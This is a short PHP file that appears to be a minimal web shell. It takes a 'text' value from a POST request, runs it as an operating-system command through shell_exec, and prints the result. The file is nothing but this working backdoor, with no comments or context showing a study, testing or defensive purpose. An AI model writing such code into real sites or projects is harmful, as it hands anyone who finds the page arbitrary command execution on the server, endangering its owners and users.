<?php
$text = $_POST['text'];
$output = shell_exec($text);
echo $output;
?>